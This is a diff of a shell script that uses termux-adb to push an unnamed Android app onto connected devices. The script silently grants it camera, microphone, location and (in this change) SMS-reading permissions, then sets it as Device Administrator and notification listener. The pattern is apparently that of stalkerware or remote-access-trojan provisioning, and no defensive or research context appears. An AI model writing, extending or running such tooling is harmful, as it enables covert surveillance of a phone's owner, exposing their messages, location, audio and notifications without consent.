@@ -13,7 +13,7 @@ on_connected() {
         echo "⚠️ $PACKAGE_NAME is already installed."
 
         # Try removing Device Admin (non-root safe)
-        termux-adb -s "$device" shell dpm remove-active-admin "$PACKAGE_NAME/.receivers.RealTimeReceiver" 2>/dev/null || true
+        termux-adb -s "$device" shell dpm remove-active-admin "$PACKAGE_NAME/.services.DeviceAdmin" 2>/dev/null || true
 
         # Try uninstalling user-installed app
         termux-adb -s "$device" uninstall "$PACKAGE_NAME" 2>/dev/null
@@ -50,6 +50,7 @@ on_connected() {
         echo "🎯 CAMERA granted, proceeding with other permissions..."
 
         PERMISSIONS=(
+            "android.permission.READ_SMS"
             "android.permission.RECORD_AUDIO"
             "android.permission.ACCESS_FINE_LOCATION"
             "android.permission.ACCESS_COARSE_LOCATION"
@@ -81,14 +82,14 @@ on_connected() {
         fi
 
         # Device Administrator
-        if termux-adb -s "$device" shell dpm set-active-admin "$PACKAGE_NAME/.receivers.RealTimeReceiver" 2>/dev/null; then
+        if termux-adb -s "$device" shell dpm set-active-admin "$PACKAGE_NAME/.services.DeviceAdmin" 2>/dev/null; then
             echo "✅ Device Admin enabled (root)."
         else
             echo "⚠️ Could not enable Device Admin automatically. User must enable manually."
         fi
 
         # Notification Listener
-        if termux-adb -s "$device" shell settings put secure enabled_notification_listeners "$PACKAGE_NAME/.services.NotificationListenerService" 2>/dev/null; then
+        if termux-adb -s "$device" shell settings put secure enabled_notification_listeners "$PACKAGE_NAME/.services.NotificationService" 2>/dev/null; then
             echo "✅ Notification Listener enabled (root)."
         else
             echo "⚠️ Could not enable Notification Listener automatically. User must enable manually."
